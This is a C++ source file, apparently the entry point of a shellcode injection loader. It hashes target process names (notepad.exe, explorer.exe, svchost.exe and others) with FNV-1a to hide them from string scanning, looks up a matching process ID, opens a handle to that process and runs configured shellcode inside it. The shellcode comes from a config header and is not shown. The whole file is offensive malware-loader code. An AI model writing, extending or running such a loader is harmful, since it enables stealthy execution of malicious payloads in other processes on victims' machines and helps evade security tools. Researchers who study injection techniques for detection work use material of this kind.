#include "config.hpp"
#include "malapi.hpp"
#include "execute.hpp"
#include "encrypt.hpp"

#ifndef _DEBUG
#pragma comment(linker, "/ENTRY:entry")
#endif

VOID entry(void)
{
	DWORD	pid = 0;
	HANDLE	process_handle = NULL;
	// unsigned char shellcode[] = EncryptShellcode(CONFIG_PAYLOAD_SHELLCODE, CONFIG_ENCRYPT_KEY, sizeof(shellcode), sizeof(CONFIG_ENCRYPT_KEY));
	unsigned char shellcode[] = CONFIG_PAYLOAD_SHELLCODE;

	constexpr ULONG targets[] = {
		malapi::HashStringFowlerNollVoVariant1a("notepad.exe"),
		malapi::HashStringFowlerNollVoVariant1a("werfault.exe"),
		malapi::HashStringFowlerNollVoVariant1a("explorer.exe"),
		malapi::HashStringFowlerNollVoVariant1a("svchost.exe"),
	};

	pid = malapi::GetPidFromHashedList((DWORD*)targets, 1);
	if (pid == NULL)
	{
		LOG_ERROR("Error getting Process ID.");
		return;
	}
	LOG_SUCCESS("Process ID: %d", pid);

	process_handle = malapi::GetProcessHandle(pid);

	if (!ExecuteShellcode(process_handle, shellcode, sizeof(shellcode)))
	{
		LOG_ERROR("Failed to execute shellcode.");
	}
}

#pragma region [alternate entrypoints]

int main(void) { entry(); return 0; }

#pragma endregion